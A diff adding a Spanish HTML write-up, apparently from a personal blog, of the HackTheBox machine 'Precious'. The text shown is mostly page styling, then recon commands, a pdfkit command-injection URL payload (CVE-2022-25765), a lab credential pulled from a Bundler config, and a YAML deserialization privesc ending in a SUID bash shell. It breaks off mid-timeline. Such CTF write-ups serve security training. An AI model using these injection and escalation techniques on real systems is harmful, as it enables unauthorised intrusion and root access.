@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Precious — HTB Machine Writeup | Yoandy Ramirez Delgado</title>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --ink:#0b1a10;--forest:#0f2318;--pine:#163020;--moss:#1e4030;--sage:#2a6048;
+  --green:#00e87a;--green2:rgba(0,232,122,.15);--green3:rgba(0,232,122,.06);
+  --cream:#f2ede4;--cream2:#faf7f1;
+  --text:#c8f0dc;--text2:rgba(200,240,220,.65);--text3:rgba(200,240,220,.35);
+  --card:#0d2215;--card2:#112b1c;--border:rgba(0,232,122,.1);
+  --red:#f87171;--yellow:#fbbf24;--blue:#60a5fa;--purple:#a78bfa;--orange:#fb923c;--cyan:#22d3ee;
+  --bb:'Bebas Neue',sans-serif;--dm:'DM Sans',sans-serif;--mo:'JetBrains Mono',monospace;
+  --accent:#00e87a;--bg:#0b1a10;--bg2:#0f2318;--bg3:#163020;
+  --text-muted:rgba(200,240,220,.35);--text-dim:rgba(200,240,220,.65);
+  --green4:#4ade80;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--ink);color:var(--text);font-family:var(--dm);line-height:1.7;font-size:15px;}
+a{color:var(--green);text-decoration:none;}
+code{background:var(--card2);padding:.15rem .4rem;border-radius:3px;font-family:var(--mo);font-size:.88em;color:var(--green);}
+pre{margin:0;white-space:pre-wrap;word-break:break-all;font-family:var(--mo);}
+ul{padding-left:1.5rem;}li{margin:.35rem 0;}
+h2{font-family:var(--bb);font-size:1.6rem;color:var(--text);border-bottom:1px solid var(--border);padding-bottom:.5rem;margin-bottom:1.25rem;letter-spacing:.04em;}
+h3{font-size:1.05rem;color:var(--text);margin-bottom:.75rem;font-weight:600;}
+
+/* ─── HERO ─── */
+.hero {
+  background: linear-gradient(135deg, var(--forest) 0%, var(--ink) 50%, #091a10 100%);
+  border-bottom: 1px solid var(--border);
+  padding: 60px 40px 50px;
+  position: relative;
+  overflow: hidden;
+}
+.hero::before {
+  content: '';
+  position: absolute; inset: 0;
+  background-image: linear-gradient(rgba(0,232,122,0.03) 1px, transparent 1px),
+                    linear-gradient(90deg, rgba(0,232,122,0.03) 1px, transparent 1px);
+  background-size: 56px 56px;
+  pointer-events: none;
+}
+.hero-layout {
+  max-width: 1200px; margin: 0 auto;
+  display: grid; grid-template-columns: 1fr 280px; gap: 48px; align-items: center;
+}
+@media(max-width: 900px) {
+  .hero-layout { grid-template-columns: 1fr; }
+  .hero-orb { order: -1; justify-self: center; }
+  .hero-meta { justify-content: center; }
+  .hero-sub { margin-left: auto; margin-right: auto; }
+  .hero-stats { justify-content: center; }
+}
+.hero-left { position: relative; z-index: 2; }
+.hero-brand {
+  font-family: var(--mo); font-size: 0.65rem;
+  color: rgba(0,232,122,0.45); letter-spacing: 0.2em; margin-bottom: 16px;
+  display: flex; align-items: center; gap: 8px;
+}
+.hero-brand-dot {
+  width: 6px; height: 6px; border-radius: 50%; background: var(--green);
+  box-shadow: 0 0 10px var(--green); animation: hpd 1.2s infinite alternate;
+}
+@keyframes hpd { to { opacity: 0.2; transform: scale(0.5); } }
+.hero h1 {
+  font-family: var(--bb); font-size: clamp(2.4rem, 4vw, 3.5rem);
+  font-weight: 400; letter-spacing: 0.04em; margin-bottom: 14px; line-height: 1;
+  color: var(--text);
+}
+.hero h1 span { color: var(--green); }
+.hero-sub {
+  color: var(--text2); font-size: 0.95rem; max-width: 600px;
+  margin-bottom: 24px; line-height: 1.7; font-weight: 300;
+}
+.hero-meta {
+  display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-bottom: 18px;
+}
+.tag {
+  display: inline-flex; align-items: center; gap: 5px;
+  padding: 4px 12px; border-radius: 4px;
+  font-family: var(--mo);
+  font-size: 10px; font-weight: 500; letter-spacing: 0.8px; text-transform: uppercase;
+}
+.tag-platform { background: rgba(0,232,122,0.1); color: var(--green); border: 1px solid rgba(0,232,122,0.25); }
+.tag-category { background: rgba(56,217,245,0.08); color: var(--cyan); border: 1px solid rgba(56,217,245,0.2); }
+.tag-diff { background: rgba(0,232,122,0.08); color: var(--green); border: 1px solid rgba(0,232,122,0.2); }
+.tag-diff-medium { background: rgba(245,166,35,0.08); color: #f5a623; border: 1px solid rgba(245,166,35,0.2); }
+.tag-diff-hard { background: rgba(248,113,113,0.08); color: var(--red); border: 1px solid rgba(248,113,113,0.2); }
+.tag-os { background: rgba(167,139,250,0.08); color: var(--purple); border: 1px solid rgba(167,139,250,0.2); }
+.tag-staff { background: rgba(245,166,35,0.08); color: #f5a623; border: 1px solid rgba(245,166,35,0.2); }
+.hero-stats {
+  display: flex; gap: 28px; flex-wrap: wrap;
+}
+.stat { display: flex; flex-direction: column; gap: 2px; }
+.stat-label {
+  font-family: var(--mo);
+  font-size: 9px; text-transform: uppercase; letter-spacing: 1.5px; color: var(--text3);
+}
+.stat-value { font-size: 1rem; font-weight: 700; color: var(--text); }
+.stat-value.green { color: var(--green); }
+
+/* Orb */
+.hero-orb { display: flex; align-items: center; justify-content: center; position: relative; }
+.orb-w { position: relative; width: 260px; height: 260px; }
+.orb-w .orb-el { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; }
+.orb-ring { position: absolute; border-radius: 50%; border: 1px solid; animation: ors linear infinite; }
+.orb-r1 { width: 260px; height: 260px; border-color: rgba(0,232,122,0.08); animation-duration: 30s; }
+.orb-r2 { width: 214px; height: 214px; border-color: rgba(0,232,122,0.12); animation-duration: 20s; animation-direction: reverse; border-style: dashed; }
+.orb-r3 { width: 172px; height: 172px; border-color: rgba(0,232,122,0.15); animation-duration: 15s; }
+@keyframes ors { to { transform: rotate(360deg); } }
+.orb-aura {
+  position: absolute; width: 200px; height: 200px; border-radius: 50%;
+  background: radial-gradient(circle, rgba(0,232,122,0.18) 0%, rgba(0,232,122,0.08) 35%, transparent 70%);
+  animation: oap 4s ease-in-out infinite;
+}
+@keyframes oap { 0%,100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } }
+.orb-core {
+  width: 130px; height: 130px; border-radius: 50%;
+  background: radial-gradient(circle at 38% 35%, rgba(0,232,122,0.35) 0%, rgba(15,48,32,0.8) 50%, rgba(11,26,16,0.95) 100%);
+  border: 1px solid rgba(0,232,122,0.3);
+  box-shadow: 0 0 60px rgba(0,232,122,0.2), 0 0 120px rgba(0,232,122,0.08), inset 0 0 40px rgba(0,232,122,0.1);
+  position: relative; z-index: 3; display: flex; align-items: center; justify-content: center; overflow: hidden;
+}
+.orb-core::before {
+  content: ''; position: absolute; top: 10%; left: 15%; width: 40%; height: 30%;
+  border-radius: 50%; background: rgba(255,255,255,0.12); filter: blur(8px);
+}
+.orb-rune {
+  font-family: var(--bb); font-size: 2.2rem; color: rgba(0,232,122,0.7);
+  text-shadow: 0 0 30px var(--green); position: relative; z-index: 2;
+  animation: org 3s ease-in-out infinite;
+}
+@keyframes org { 0%,100% { text-shadow: 0 0 20px var(--green), 0 0 40px rgba(0,232,122,0.4); } 50% { text-shadow: 0 0 40px var(--green), 0 0 80px rgba(0,232,122,0.6); } }
+.orb-scan {
+  position: absolute; left: 0; right: 0; height: 1.5px;
+  background: linear-gradient(90deg, transparent, rgba(0,232,122,0.5), transparent);
+  animation: osc 3s linear infinite; z-index: 4; pointer-events: none;
+}
+@keyframes osc { 0% { top: 5%; opacity: 0; } 10% { opacity: 0.8; } 90% { opacity: 0.5; } 100% { top: 95%; opacity: 0; } }
+.particle{position:absolute;width:3px;height:3px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green);animation:pf linear infinite}
+.p1{top:15%;left:25%;animation-duration:6s}.p2{top:25%;right:18%;animation-duration:8s;animation-delay:-2s;width:4px;height:4px}.p3{bottom:20%;left:30%;animation-duration:7s;animation-delay:-4s}.p4{bottom:30%;right:25%;animation-duration:9s;animation-delay:-1s;opacity:.6}
+@keyframes pf{0%{transform:translateY(0) scale(1);opacity:1}33%{transform:translateY(-12px) translateX(8px) scale(1.3);opacity:.7}66%{transform:translateY(-6px) translateX(-10px) scale(.8);opacity:.9}100%{transform:translateY(0) scale(1);opacity:1}}
+
+/* ─── LAYOUT ─── */
+.container{display:grid;grid-template-columns:1fr 300px;gap:2rem;max-width:1200px;margin:2rem auto;padding:0 1.5rem;}
+@media(max-width:900px){.container{grid-template-columns:1fr;}.code-compare,.lessons-grid{grid-template-columns:1fr;}}
+
+/* ─── SECTIONS ─── */
+.section{margin:2.5rem 0;}
+.step-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.step-number{font-size:.7rem;color:var(--green);font-weight:700;text-transform:uppercase;letter-spacing:3px;margin-bottom:.4rem;font-family:var(--mo);}
+.why-box{background:rgba(0,232,122,.05);border-left:3px solid rgba(0,232,122,.4);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.why-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.why-box p{font-size:.9rem;color:var(--text2);}
+.cmd-annotated{background:rgba(5,14,8,.9);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);margin:1rem 0;border:1px solid var(--border);}
+.cmd-line{font-size:1rem;line-height:2;}
+.cmd{color:var(--green);font-weight:700;}.flag-opt{color:var(--yellow);}.ip{color:var(--orange);}.param{color:var(--cyan);}
+.user-c{color:var(--purple);}.str-c{color:var(--green);}.comment-c{color:var(--text3);}
+.cmd-notes{margin-top:.75rem;padding-top:.75rem;border-top:1px solid var(--border);display:flex;flex-direction:column;gap:.3rem;}
+.cmd-note{font-size:.8rem;color:var(--text2);padding:.3rem .75rem;border-left:2px solid var(--border);}
+.output-box{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);font-size:.82rem;color:var(--text2);margin:1rem 0;overflow-x:auto;line-height:1.6;}
+.output-label{font-size:.65rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.interpret-box{background:rgba(0,232,122,.05);border-left:3px solid var(--green);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.interpret-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.interpret-box p,.interpret-box li{font-size:.88rem;color:var(--text2);}
+.decision-box{background:rgba(251,146,60,.05);border-left:3px solid var(--orange);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.decision-box strong{color:var(--orange);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.decision-box p{font-size:.88rem;color:var(--text2);}
+.info-box{background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:1.25rem;margin:1.25rem 0;}
+.info-box p{font-size:.9rem;color:var(--text2);}
+.vuln-card{background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.vuln-card h3{color:var(--red);margin-bottom:.75rem;}
+.agent-panel{display:grid;grid-template-columns:1fr 1fr 1fr;gap:1rem;margin:1.5rem 0;}
+@media(max-width:700px){.agent-panel{grid-template-columns:1fr;}}
+.agent-card{background:var(--card2);border-radius:10px;padding:1rem;border:1px solid var(--border);}
+.agent-card.rto{border-top:3px solid var(--orange);}
+.agent-card.bta{border-top:3px solid var(--cyan);}
+.agent-card.bhm{border-top:3px solid var(--purple);}
+.agent-label{font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.agent-card.rto .agent-label{color:var(--orange);}
+.agent-card.bta .agent-label{color:var(--cyan);}
+.agent-card.bhm .agent-label{color:var(--purple);}
+.agent-card p{font-size:.82rem;color:var(--text2);}
+.warning-card{background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-radius:8px;padding:1rem;display:flex;gap:1rem;align-items:flex-start;margin:1rem 0;}
+.warning-icon{font-size:1.5rem;flex-shrink:0;}
+.warning-card strong{color:var(--red);display:block;margin-bottom:.25rem;}
+.warning-card p{font-size:.85rem;color:var(--text2);}
+.worknotes-box{background:rgba(251,191,36,.04);border:1px solid rgba(251,191,36,.15);border-radius:10px;padding:1.25rem;margin:1rem 0;}
+.worknotes-box h4{color:var(--yellow);font-size:.85rem;margin-bottom:.75rem;}
+.data-table{width:100%;border-collapse:collapse;font-size:.85rem;margin:1rem 0;}
+.data-table th{background:var(--card2);color:var(--text3);padding:.6rem 1rem;text-align:left;font-size:.75rem;text-transform:uppercase;}
+.data-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+.data-table tr:last-child td{border-bottom:none;}
+.data-table .highlight{color:var(--green);font-weight:600;}
+.lessons-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1rem 0;}
+@media(max-width:700px){.lessons-grid{grid-template-columns:1fr;}}
+.lesson-card{background:var(--card2);border-radius:10px;padding:1.25rem;border:1px solid var(--border);}
+.lesson-card h4{font-size:.85rem;margin-bottom:.75rem;}
+.lesson-card.attacker h4{color:var(--orange);}
+.lesson-card.defender h4{color:var(--cyan);}
+.lesson-card li{font-size:.83rem;color:var(--text2);}
+.flag-box{background:linear-gradient(135deg,rgba(0,232,122,.06),rgba(0,232,122,.02));border:1px solid rgba(0,232,122,.25);border-radius:14px;padding:2rem;text-align:center;margin:2.5rem 0;}
+.flag-label{font-size:.75rem;color:var(--text3);text-transform:uppercase;letter-spacing:3px;margin-bottom:.75rem;font-family:var(--mo);}
+.flag-value{font-family:var(--mo);font-size:1.1rem;color:var(--green);background:rgba(0,232,122,.08);padding:.6rem 1.5rem;border-radius:8px;display:inline-block;border:1px solid rgba(0,232,122,.2);}
+
+/* ─── SIDEBAR ─── */
+.sidebar{position:sticky;top:2rem;height:fit-content;}
+.sidebar-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.25rem;margin-bottom:1rem;}
+.sidebar-card h4{margin:0 0 .9rem;font-size:.72rem;text-transform:uppercase;letter-spacing:2px;color:var(--text3);font-family:var(--mo);}
+.meta-row{display:flex;justify-content:space-between;align-items:center;font-size:.83rem;padding:.45rem 0;border-bottom:1px solid var(--border);}
+.meta-row:last-child{border-bottom:none;}
+.meta-label{color:var(--text3);}.meta-value{color:var(--text);font-weight:600;font-family:var(--mo);font-size:.8rem;}
+.mitre-tag{display:inline-block;background:rgba(167,139,250,.08);color:var(--purple);border:1px solid rgba(167,139,250,.2);border-radius:4px;padding:.2rem .5rem;font-size:.72rem;font-family:var(--mo);margin:.2rem .15rem;}
+.score-num{font-size:2.8rem;font-weight:900;color:var(--green);text-align:center;line-height:1;margin:.5rem 0;font-family:var(--bb);}
+.score-label{text-align:center;font-size:.75rem;color:var(--text3);}
+.glosario-item{padding:.5rem 0;border-bottom:1px solid var(--border);font-size:.8rem;}
+.glosario-item:last-child{border-bottom:none;}
+.glosario-term{color:var(--cyan);font-weight:600;font-family:var(--mo);display:block;margin-bottom:.15rem;}
+.glosario-def{color:var(--text3);line-height:1.4;}
+
+/* ─── EXTRA COMPONENT STYLES ─── */
+.nse-bonus{background:linear-gradient(135deg,rgba(251,191,36,.06),rgba(251,191,36,.02));border:1px solid rgba(251,191,36,.3);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.nse-bonus h3{color:var(--yellow);margin-bottom:.75rem;}
+.ftp-session{background:rgba(5,14,8,.9);border-radius:12px;padding:1.25rem;margin:1rem 0;font-family:var(--mo);font-size:.82rem;}
+.ftp-cmd{color:var(--cyan);}.ftp-resp{color:var(--text3);}.ftp-success{color:var(--green);}.ftp-flag{color:var(--yellow);font-weight:700;}
+.key-dump{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:12px;padding:1.25rem;margin:1.5rem 0;font-family:var(--mo);}
+.key-dump-header{font-size:.65rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:1rem;}
+.key-row{display:flex;align-items:center;gap:1rem;padding:.5rem .75rem;border-radius:6px;margin:.3rem 0;}
+.key-row.flag-key{background:rgba(0,232,122,.05);border:1px solid rgba(0,232,122,.15);}
+.key-name{color:var(--cyan);min-width:60px;font-weight:600;}
+.key-arrow{color:var(--border);}.key-value{color:var(--text2);flex:1;}
+.key-row.flag-key .key-value{color:var(--green);font-weight:600;}
+.key-badge{background:rgba(0,232,122,.15);color:var(--green);padding:.1rem .5rem;border-radius:4px;font-size:.7rem;font-weight:700;border:1px solid rgba(0,232,122,.3);}
+.rce-path{display:flex;flex-wrap:wrap;align-items:center;gap:.5rem;padding:1.25rem;background:rgba(248,113,113,.04);border:1px solid rgba(248,113,113,.15);border-radius:10px;margin:1rem 0;}
+.rce-step{background:var(--card2);padding:.35rem .75rem;border-radius:6px;font-family:var(--mo);font-size:.8rem;color:var(--text2);}
+.rce-arrow{color:var(--text3);font-size:1.2rem;}
+.rce-result{color:var(--red);border:1px solid rgba(248,113,113,.3);background:rgba(248,113,113,.08);}
+.redis-cmd-table{width:100%;border-collapse:collapse;font-size:.84rem;margin:1rem 0;font-family:var(--mo);}
+.redis-cmd-table th{background:var(--card2);color:var(--text3);padding:.6rem 1rem;text-align:left;font-size:.72rem;text-transform:uppercase;}
+.redis-cmd-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+.redis-cmd-table tr:last-child td{border-bottom:none;}
+.sqli-box{background:rgba(5,14,8,.9);border-radius:12px;padding:1.5rem;margin:1.5rem 0;border:1px solid var(--border);}
+.sqli-row{margin:.75rem 0;display:flex;align-items:flex-start;gap:1rem;}
+.sqli-label{color:var(--text3);font-size:.78rem;min-width:110px;font-family:var(--mo);padding-top:.2rem;flex-shrink:0;}
+.sqli-query{font-family:var(--mo);font-size:.88rem;line-height:1.8;flex:1;}
+.q-keyword{color:var(--blue);font-weight:700;}.q-string{color:var(--green);}.q-inject{color:var(--red);font-weight:900;font-size:1.1rem;}
+.q-comment{color:var(--text3);text-decoration:line-through;opacity:.55;}.q-result{color:var(--yellow);font-size:.8rem;margin-left:.5rem;}
+.sqli-divider{border:none;border-top:1px solid var(--border);margin:.75rem 0;}
+.code-compare{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1.5rem 0;}
+.vuln-code,.safe-code{border-radius:8px;padding:1rem;border:1px solid;}
+.vuln-code{background:rgba(248,113,113,.05);border-color:rgba(248,113,113,.3);}
+.safe-code{background:rgba(0,232,122,.05);border-color:rgba(0,232,122,.3);}
+.code-header{font-size:.82rem;font-weight:700;margin-bottom:.75rem;}
+.vuln-code .code-header{color:var(--red);}.safe-code .code-header{color:var(--green);}
+.code-box{background:rgba(5,14,8,.9);border-radius:6px;padding:.75rem;font-family:var(--mo);font-size:.78rem;color:var(--text2);margin:.5rem 0;}
+.code-note{font-size:.8rem;margin-top:.5rem;}
+.vuln-code .code-note{color:var(--red);}.safe-code .code-note{color:var(--green);}
+.curl-breakdown{background:rgba(5,14,8,.9);border-radius:12px;padding:1.5rem;border:1px solid var(--border);margin:1rem 0;}
+.curl-parts-top{display:flex;flex-wrap:wrap;gap:.75rem;margin-bottom:1rem;}
+.curl-part-item{display:flex;flex-direction:column;align-items:center;gap:.4rem;min-width:80px;}
+.curl-token{font-family:var(--mo);padding:.25rem .6rem;background:var(--card2);border-radius:4px;font-size:.82rem;white-space:nowrap;}
+.curl-token.cmd-t{color:var(--green);}.curl-token.flag-t{color:var(--yellow);}.curl-token.url-t{color:var(--orange);}
+.curl-explain-small{font-size:.72rem;color:var(--text3);text-align:center;max-width:100px;}
+.curl-payload{border-top:1px solid var(--border);padding-top:1rem;display:flex;gap:1rem;}
+.curl-payload-token{font-family:var(--mo);font-size:.82rem;color:var(--text2);background:var(--card2);padding:.4rem .75rem;border-radius:4px;flex-shrink:0;}
+.curl-payload-explain{font-size:.82rem;color:var(--text2);}
+.curl-payload-explain strong{color:var(--text);}
+.payloads-table{width:100%;border-collapse:collapse;font-size:.84rem;margin:1rem 0;}
+.payloads-table th{background:var(--card2);color:var(--text3);padding:.6rem 1rem;text-align:left;font-size:.72rem;text-transform:uppercase;}
+.payloads-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+.payloads-table tr:last-child td{border-bottom:none;}
+.payloads-table td code{color:var(--red);background:rgba(248,113,113,.1);padding:.1rem .3rem;border-radius:3px;}
+.highlight-row{background:rgba(0,232,122,.04);}
+.highlight-row td{border-left:3px solid var(--green);}
+.record-badge{background:rgba(251,191,36,.1);color:var(--yellow);border:1px solid rgba(251,191,36,.3);border-radius:6px;padding:.3rem .75rem;font-size:.75rem;text-align:center;margin-top:.5rem;}
+.owasp-badge{background:rgba(248,113,113,.1);color:var(--red);border:1px solid rgba(248,113,113,.3);border-radius:6px;padding:.4rem .75rem;font-size:.78rem;font-weight:600;text-align:center;margin:.5rem 0;}
+.smb-tree{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;padding:1.25rem;font-family:var(--mo);font-size:.85rem;color:var(--text2);margin:1rem 0;}
+
+</style>
+</head>
+<body>
+
+<!-- ═══ HERO ═══ -->
+<div class="hero">
+  <div class="hero-layout">
+    <div class="hero-left">
+      <div class="hero-brand"><span class="hero-brand-dot"></span>HEINDALL // WRITEUP</div>
+      <div class="hero-meta">
+        <span class="tag tag-platform">HackTheBox</span>
+        <span class="tag tag-category">Machines</span>
+        <span class="tag tag-diff">Easy</span>
+        <span class="tag tag-os">Linux</span>
+      </div>
+      <h1><span>Precious</span> — PDFKit RCE + YAML Deserialization</h1>
+      <p class="hero-sub">Explotación de PDFKit (CVE-2022-25765) para obtener RCE inicial mediante inyección de comandos en la generación de PDFs. Posterior escalada de privilegios mediante deserialización YAML insegura en un script Ruby ejecutado con sudo.</p>
+      <div class="hero-stats">
+        <div class="stat"><span class="stat-label">Target</span><span class="stat-value green">10.10.11.189</span></div>
+        <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Linux</span></div>
+        <div class="stat"><span class="stat-label">Puerto</span><span class="stat-value">22,80</span></div>
+        <div class="stat"><span class="stat-label">Tiempo</span><span class="stat-value">~20 min</span></div>
+        <div class="stat"><span class="stat-label">CVEs</span><span class="stat-value">1</span></div>
+      </div>
+    </div>
+    <!-- Orb — Right -->
+    <div class="hero-orb">
+      <div class="orb-w">
+        <div class="orb-el">
+          <div class="orb-ring orb-r1"></div>
+          <div class="orb-ring orb-r2"></div>
+          <div class="orb-ring orb-r3"></div>
+          <div class="orb-aura"></div>
+          <div class="orb-core"><span class="orb-rune">ᚺ</span></div>
+          <div class="orb-scan"></div>
+          <div class="particle p1"></div>
+          <div class="particle p2"></div>
+          <div class="particle p3"></div>
+          <div class="particle p4"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+
+  <!-- QUICK STATS -->
+  <div class="quick-stats">
+    <div class="qs-card">
+      <div class="qs-num">2</div>
+      <div class="qs-label">Puertos abiertos</div>
+    </div>
+    <div class="qs-card">
+      <div class="qs-num">1</div>
+      <div class="qs-label">CVE explotado</div>
+    </div>
+    <div class="qs-card">
+      <div class="qs-num">3</div>
+      <div class="qs-label">Usuarios pivotados</div>
+    </div>
+    <div class="qs-card">
+      <div class="qs-num" style="color:var(--red)">ROOT</div>
+      <div class="qs-label">Acceso final</div>
+    </div>
+  </div>
+
+  <div class="grid">
+    <div class="main">
+
+      <!-- DESCRIPCION -->
+      <section id="desc">
+        <div class="section-header">
+          <div class="section-number">1</div>
+          <div class="section-title">Descripción</div>
+        </div>
+        <p>Precious es una máquina Linux de dificultad Easy de Hack The Box que expone una aplicación web Ruby/Sinatra con generación de PDFs. La cadena de ataque encadena dos vulnerabilidades reales:</p>
+        <div class="chain">
+          <div class="chain-item">
+            <div class="chain-arrow">→</div>
+            <div class="chain-content">
+              <div class="chain-label">Foothold</div>
+              <div class="chain-text">CVE-2022-25765 — pdfkit v0.8.6 command injection</div>
+              <div class="chain-sub">Inyección de SSH key → acceso como usuario ruby</div>
+            </div>
+          </div>
+          <div class="chain-item">
+            <div class="chain-arrow">→</div>
+            <div class="chain-content">
+              <div class="chain-label">Movimiento lateral</div>
+              <div class="chain-text">Credenciales en ~/.bundle/config</div>
+              <div class="chain-sub">henry:Q3c1AqGHtoI0aXAYFH → user.txt</div>
+            </div>
+          </div>
+          <div class="chain-item">
+            <div class="chain-arrow">→</div>
+            <div class="chain-content">
+              <div class="chain-label">Privesc</div>
+              <div class="chain-text">sudo ruby /opt/update_dependencies.rb → YAML.load gadget chain</div>
+              <div class="chain-sub">chmod u+s /bin/bash → bash -p → euid=root → root.txt</div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- RECONOCIMIENTO -->
+      <section id="recon">
+        <div class="section-header">
+          <div class="section-number">2</div>
+          <div class="section-title">Reconocimiento</div>
+        </div>
+
+        <div class="step-box">
+          <div class="step-title">
+            <span class="step-num">PASO 1</span>
+            <span class="step-name">Escaneo de puertos — nmap</span>
+          </div>
+          <div class="why-box"><strong>¿Por qué?</strong> Identificar la superficie de ataque antes de cualquier acción. Empezamos con -p- para cubrir todos los puertos y luego -sC -sV para extraer versiones y ejecutar scripts estándar.</div>
+          <div class="code-block">
+            <div class="code-label">bash — fase 1: todos los puertos</div>
+            <div class="code-body">
+              <span class="cmd">nmap</span> <span class="param">-p-</span> <span class="param">--open</span> <span class="param">-n</span> <span class="param">-T4</span> <span class="param">-sS</span> <span class="ip">10.129.228.98</span>
+            </div>
+          </div>
+          <div class="code-block">
+            <div class="code-label">bash — fase 2: profundo en puertos abiertos</div>
+            <div class="code-body">
+              <span class="cmd">nmap</span> <span class="param">-p 22,80</span> <span class="param">-sC</span> <span class="param">-sV</span> <span class="param">-n</span> <span class="ip">10.129.228.98</span>
+            </div>
+          </div>
+          <div class="code-block">
+            <div class="code-label">output</div>
+            <div class="code-body">
+PORT   STATE SERVICE VERSION<br>
+<span class="success">22/tcp open  ssh</span>     OpenSSH 8.4p1 Debian<br>
+<span class="success">80/tcp open  http</span>    nginx 1.18.0<br>
+<span class="comment">|_http-title: Did not follow redirect to http://precious.htb/</span>
+            </div>
+          </div>
+          <div class="interpret-box"><strong>Interpretación:</strong> Solo dos puertos. El redirect a <code>precious.htb</code> indica un vhost — necesitamos añadirlo a /etc/hosts. La app web es nuestro vector principal.</div>
+          <div class="decision-box"><strong>Decisión:</strong> Añadir precious.htb a /etc/hosts y explorar la aplicación web.</div>
+        </div>
+
+        <div class="step-box">
+          <div class="step-title">
+            <span class="step-num">PASO 2</span>
+            <span class="step-name">Reconocimiento web — whatweb + curl</span>
+          </div>
+          <div class="code-block">
+            <div class="code-label">bash</div>
+            <div class="code-body">
+              <span class="cmd">whatweb</span> <span class="ip">http://precious.htb/</span><br>
+              <span class="comment"># Output: Ruby, Sinatra, pdfkit/0.8.6, WEBrick/1.7.0</span>
+            </div>
+          </div>
+          <div class="interpret-box"><strong>Interpretación:</strong> La aplicación usa <strong>pdfkit v0.8.6</strong>. Esta versión exacta es vulnerable a <strong>CVE-2022-25765</strong> (command injection via URL parameter). La app acepta una URL y genera un PDF — perfecto vector para inyección.</div>
+        </div>
+      </section>
+
+      <!-- VULNERABILIDADES -->
+      <section id="vulns">
+        <div class="section-header">
+          <div class="section-number">3</div>
+          <div class="section-title">Vulnerabilidades identificadas</div>
+        </div>
+
+        <div class="vuln-card">
+          <div class="vuln-title">CVE-2022-25765 — pdfkit v0.8.6 Command Injection <span class="badge badge-red">CRÍTICO</span></div>
+          <div class="vuln-body">pdfkit construye un comando shell que incluye la URL sin sanitizar. Una URL con la forma <code>http://%20`comando`</code> hace que el shell ejecute el comando en el subshell. Afecta a pdfkit &lt; 0.8.7.</div>
+        </div>
+
+        <div class="vuln-card" style="border-left-color:var(--yellow)">
+          <div class="vuln-title" style="color:var(--yellow)">Credenciales en texto plano (~/.bundle/config) <span class="badge badge-yellow">ALTO</span></div>
+          <div class="vuln-body">Bundler guarda credenciales de repositorios Ruby en texto plano en <code>~/.bundle/config</code>. El usuario ruby tenía las credenciales de henry almacenadas en este fichero.</div>
+        </div>
+
+        <div class="vuln-card" style="border-left-color:var(--red)">
+          <div class="vuln-title">Ruby YAML Insecure Deserialization + Sudo Misconfiguration <span class="badge badge-red">CRÍTICO</span></div>
+          <div class="vuln-body"><code>YAML.load</code> (sin <code>safe</code>) puede instanciar objetos Ruby arbitrarios. Combinado con <code>sudo</code> sin contraseña para ejecutar el script, permite RCE como root.</div>
+        </div>
+      </section>
+
+      <!-- TIMELINE -->
+      <section id="timeline">
+        <div class="section-header">
+          <div class="section-number">4</div>
+          <div class="section-title">Timeline del ataque</div>
+        </div>
+        <div class="timeline">
+          <div class="tl-item">
+            <div class="tl-dot tl-dot-blue"></div>
+            <div class="tl-label">Reconocimiento</div>
+            <div class="tl-action">nmap → 22/SSH + 80/HTTP</div>
+            <div class="tl-detail">Identificado pdfkit v0.8.6 en la app web</div>
+          </div>
+          <div class="tl-item">
+            <div class="tl-dot tl-dot-orange"></div>
+            <div class="tl-label">Explotación</div>
+            <div class="tl-action">CVE-2022-25765 — Inyección SSH key</div>
+            <div class="tl-detail">Servidor HTTP de apoyo + payload URL-encoded → foothold como ruby</div>
+          </div>
+          <div class="tl-item">
+            <div class="tl-dot tl-dot-blue"></div>
+            <div class="tl-label">Post-explotación</div>
+            <div class="tl-action">~/.bundle/config → creds henry</div>
+            <div class="tl-detail">henry:Q3c1AqGHtoI0aXAYFH</div>
+          </div>
